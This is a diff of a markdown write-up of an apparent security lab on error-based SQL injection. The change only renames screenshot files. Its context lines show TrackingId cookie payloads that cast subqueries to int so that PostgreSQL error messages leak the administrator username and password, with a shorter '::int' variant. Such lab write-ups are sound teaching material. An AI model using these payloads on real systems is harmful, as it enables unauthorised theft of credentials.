@@ -47,15 +47,15 @@ Unterminated string literal...
 
 * `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` → Error: invalid input syntax for type integer: "administrator" → **Username leaked: administrator**
 
-![check datatype column](images/14/payload_ck2.png)
+![check datatype column](images/14/payload_ck2_vl.png)
 
 It also checked tracking id so first remove that and again checked and its worked.
 
-![check datatype column](images/14/payload_ck3.png)
+![check datatype column](images/14/payload_ck3_Id_rm.png)
 
 * `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` → Error: invalid input syntax for type integer: "[PASSWORD]" → **Password leaked**
 
-![check datatype column](images/14/payload_ck4.png)
+![check datatype column](images/14/payload_ck4_pass.png)
 
 
 ### Alternative without CAST (PostgreSQL `::` shorthand):
@@ -65,7 +65,7 @@ It also checked tracking id so first remove that and again checked and its worke
 AND 1=(SELECT password FROM users LIMIT 1)::int--
 ```
 
-![check datatype column](images/14/payload_ck5.png)
+![check datatype column](images/14/payload_ck5_pass1.png)
 
 Same error-based leak, shorter payload.
 
